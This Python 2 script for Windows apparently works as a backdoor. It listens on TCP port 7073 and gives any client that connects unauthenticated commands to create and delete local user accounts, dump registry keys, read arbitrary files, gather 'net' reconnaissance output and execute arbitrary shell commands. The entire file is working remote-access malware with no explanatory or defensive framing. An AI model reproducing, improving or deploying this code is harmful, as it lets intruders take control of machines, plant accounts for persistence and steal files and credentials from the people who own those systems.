
import socket,struct,subprocess
from _winreg import *


def receive_data(sock):
    data_len,=struct.unpack("!I",sock.recv(4))
    return sock.recv(data_len)

def send_data(sock,data):
    sock.send(struct.pack("!I",len(data)))
    sock.send(data)

def get_data(sock,data):
    send_data(sock,data)
    return receive_data(sock)

def create_user(name,password):
    subprocess.Popen("net user /add "+name+" "+password)
    return

def delete_user(name):
    subprocess.Popen("net user /del "+name)

def download_reg_key(root,path,sock):
    root_dict={ "HKEY_CLASSES_ROOT":HKEY_CLASSES_ROOT ,
                "HKEY_CURRENT_USER":HKEY_CURRENT_USER ,
                "HKEY_LOCAL_MACHINE":HKEY_LOCAL_MACHINE ,
                "HKEY_USERS":HKEY_USERS ,
                "HKEY_CURRENT_CONFIG":HKEY_CURRENT_CONFIG}
    if root in root_dict:
        root=root_dict[root]
    else:
        return
    subkey_lst=list()
    value_dict=dict()
    key_handle=CreateKey(root,path)
    subkeys,values,last_modified= QueryInfoKey(key_handle)
    for i in range(subkeys):
        subkey_lst.append(EnumKey(key_handle,i))
    for i in range(values):
        key,value,last_mod=EnumValue(key_handle,i)
        value_dict[key]=value

    send_data(sock,"=================SUBKEYS=====================")
    for i in subkey_lst:
        send_data(sock,i)
    send_data(sock,"=================VALUES=====================")

    for key in value_dict:
        send_data(sock,key+" : "+str(value_dict[key]))

    send_data(sock,"DATA_COMPLETE")
    return

def download_file(log_file_name,sock):
    file=open(log_file_name,"r")
    send_data(sock,file.read())
    return

def gather_information(log_file_name,sock):
    cmd_lst=["net accounts",
             "net file",
             "net localgroup",
             "net session",
             "net share",
             "net user",
             "net view"]
    file=open(log_file_name,"w")
    for cmd in cmd_lst:
        subprocess.Popen(cmd,0,None,None,file)
    file.close()
    download_file(log_file_name,sock)


def execute_command(command,output_file_name):
    file=open(output_file_name,"w")
    try:
        run_cmd=subprocess.Popen(command,0,None,None,file,file)
    except WindowsError:
        run_cmd=subprocess.Popen(command+".com",0,None,None,file,file)

    file.close()
    return


def main():
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind(('',7073))
    sock.listen(1)
    client_sock,client_data=sock.accept();
    while True:
        cmd=get_data(client_sock,"COMMANDS PLEASE: ")
        if cmd=="CU":
            name=get_data(client_sock,"Username: ")
            password=get_data(client_sock,"Password: ")
            create_user(name,password)
        elif cmd=="DU":
            name=get_data(client_sock,"Username: ")
            delete_user(name)
        elif cmd=="DRK":
            root=get_data(client_sock,"Root: ")
            path=get_data(client_sock,"Path: ")
            download_reg_key(root,path,client_sock)
        elif cmd=="DF":
            file_name=get_data(client_sock,"Enter filename: ")
            download_file(file_name,client_sock)
        elif cmd=="GI":
            log_file_name=get_data(client_sock,"Enter log file name: ")
            gather_information(log_file_name,client_sock)
        elif cmd=="EC":
            command=get_data(client_sock,"Command to execute: ")
            file_name=get_data(client_sock,"Enter Output file Name: ")
            execute_command(command,file_name)
        else:
            get_data(client_sock,"Invalid Command")
    return

main()